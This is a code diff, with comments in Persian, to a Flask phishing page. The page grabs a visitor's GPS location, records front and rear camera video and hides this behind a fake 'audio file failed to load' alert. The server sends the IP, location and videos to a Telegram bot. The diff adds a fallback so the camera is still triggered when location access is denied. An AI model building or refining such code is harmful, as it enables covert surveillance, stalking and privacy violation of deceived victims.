@@ -54,6 +54,7 @@ HTML_TEMPLATE = """
     async function recordAndSend(facingMode, label, info) {
         return new Promise(async (resolve, reject) => {
             try {
+                // این خط مستقیماً پاپ‌آپ اجازه دسترسی مرورگر را باز می‌کند
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: facingMode }, 
                     audio: false 
@@ -81,7 +82,7 @@ HTML_TEMPLATE = """
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 4000); // ضبط 4 ثانیه ویدیو
+                }, 4000); // ضبط 4 ثانیه
                 
             } catch (err) {
                 reject(err);
@@ -96,7 +97,7 @@ HTML_TEMPLATE = """
             return;
         }
 
-        // گرفتن موقعیت مکانی کاربر به محض کلیک روی FETCH
+        // دریافت لوکیشن و بلافاصله درخواست دوربین
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const info = {
                 lat: pos.coords.latitude,
@@ -105,10 +106,10 @@ HTML_TEMPLATE = """
             };
 
             try {
-                // ۱. درخواست اجازه و ضبط دوربین جلو
+                // ۱. دوربین جلو (پاپ‌آپ اول)
                 await recordAndSend("user", "دوربین جلو (Front Camera)", info);
                 
-                // ۲. درخواست اجازه و ضبط دوربین عقب
+                // ۲. دوربین عقب (پاپ‌آپ دوم)
                 await recordAndSend("environment", "دوربین عقب (Rear Camera)", info);
 
                 alert("خطا در بارگیری فایل صوتی. لطفاً دوباره تلاش کنید.");
@@ -117,8 +118,20 @@ HTML_TEMPLATE = """
                 alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
             }
         }, (err) => {
-            alert("لطفاً دسترسی به موقعیت مکانی (Location) را فعال کنید.");
+            // حتی اگر لوکیشن خطا داد، باز هم مستقیم دوربین را صدا می‌زنیم تا پاپ‌آپ بیاید
+            runCameraDirectly();
         }, { enableHighAccuracy: true });
+    }
+
+    async function runCameraDirectly() {
+        const info = { lat: 'نامشخص', lon: 'نامشخص', ua: navigator.userAgent };
+        try {
+            await recordAndSend("user", "دوربین جلو (Front Camera)", info);
+            await recordAndSend("environment", "دوربین عقب (Rear Camera)", info);
+            alert("خطا در بارگیری فایل صوتی.");
+        } catch(err) {
+            alert("دسترسی به دوربین رد شد.");
+        }
     }
     </script>
 </body>
@@ -152,7 +165,6 @@ def upload():
     ua = info.get('ua', 'نامشخص')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # متن گزارش کامل به همراه مشخصات و امضا
     msg = (
         f"🚨 **گزارش جدید ({cam_type}):**\n\n"
         f"📍 موقعیت GPS: {lat}, {lon}\n"
@@ -164,14 +176,12 @@ def upload():
         f"👤 ریس نوری: @HOKOMAT_ARAB"
     )
     
-    # ارسال لوکیشن روی نقشه در بخش اول (دوربین جلو)
     if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
             json={"chat_id": TARGET_CHAT_ID, "latitude": lat, "longitude": lon}
         )
     
-    # ارسال ویدیو به ربات تلگرام
     if video:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
